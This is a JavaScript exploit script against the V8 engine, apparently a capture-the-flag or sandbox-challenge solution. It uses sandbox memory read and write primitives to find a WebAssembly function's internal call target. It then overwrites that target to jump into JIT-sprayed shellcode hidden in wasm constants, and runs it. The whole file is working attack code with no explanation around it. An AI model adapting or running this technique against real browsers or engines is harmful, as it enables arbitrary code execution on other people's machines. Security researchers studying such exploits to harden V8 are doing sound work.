// convert integer to hexadecimal string
function hex(i) {
    return `0x${i.toString(16)}`;
}

// get (compressed) address of `obj` in sandbox
function addrof(obj) {
    return Sandbox.getAddressOf(obj);
}

// read 4-byte from `addr` in sandbox
function read4(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 4));
    return memory_view.getUint32(0, true);
}

// read 8-byte from `addr` in sandbox
function read8(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 8));
    return memory_view.getBigUint64(0, true);
}

// write 8-byte `value` to `addr` in sandbox
function write8(addr, value) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 8));
    memory_view.setBigUint64(0, value, true);
}

// jit spraying
console.log("[+] JIT spraying...");
let wasm_src = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0xb1, 0x1, 0x1, 0xae, 0x1, 0x0, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xb2, 0x9b, 0x86, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0xdf, 0xe0, 0x9b, 0x96, 0x8c, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0xbc, 0x91, 0x96, 0xcd, 0xdb, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0xbc, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xd8, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0x90, 0x91, 0xc5, 0x81, 0x8c, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xea, 0x81, 0x83, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0x99, 0x85, 0xca, 0xd5, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x90, 0x91, 0x85, 0x86, 0x8e, 0x84, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x8a, 0x90, 0xca, 0xb4, 0x8a, 0xd4, 0xf5, 0x6, 0x42, 0xd0, 0x90, 0xa5, 0x84, 0x8e, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0xec, 0x9e, 0x85, 0x8a, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x92, 0x8a, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0xbb, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x8f, 0x8a, 0xc0, 0x84, 0x89, 0x92, 0xa4, 0xc8, 0x90, 0x7f, 0xf, 0xb]); // output of wasm.py
let wasm_module = new WebAssembly.Module(wasm_src);

let wasm_instance = new WebAssembly.Instance(wasm_module);
let main_addr = addrof(wasm_instance.exports.main);
console.log(`[+] main_addr == ${hex(main_addr)}`);

let info_addr = read4(main_addr + 0xc) - 1; // SharedFunctionInfo
console.log(`[+] info_addr == ${hex(info_addr)}`);

let data_addr = read4(info_addr + 0x4) - 1; // WasmExportedFunctionData
console.log(`[+] data_addr == ${hex(data_addr)}`);

let internal_addr = read4(data_addr + 0x4) - 1; // WasmInternalFunction
console.log(`[+] internal_addr == ${hex(internal_addr)}`);

let call_target = read8(internal_addr + 0x4);
console.log(`[+] call_target == ${hex(call_target)}`);

// overwrite call target with address of shellcode
write8(internal_addr + 0x4, call_target + 0x65dn);

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
